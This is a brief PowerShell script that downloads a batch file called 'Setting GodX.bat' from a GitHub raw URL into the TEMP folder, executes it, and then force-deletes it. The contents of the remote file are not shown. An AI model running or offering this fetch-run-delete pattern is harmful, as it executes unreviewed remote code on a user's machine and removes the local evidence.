$BatFilePath = "$env:TEMP\Setting GodX.bat"

$GithubUrl = "https://raw.githubusercontent.com/arxstore/settinggodx/refs/heads/main/Setting%20GodX.bat"

Invoke-WebRequest -Uri $GithubUrl -OutFile $BatFilePath

& "$BatFilePath"

Remove-Item -Path $BatFilePath -Force
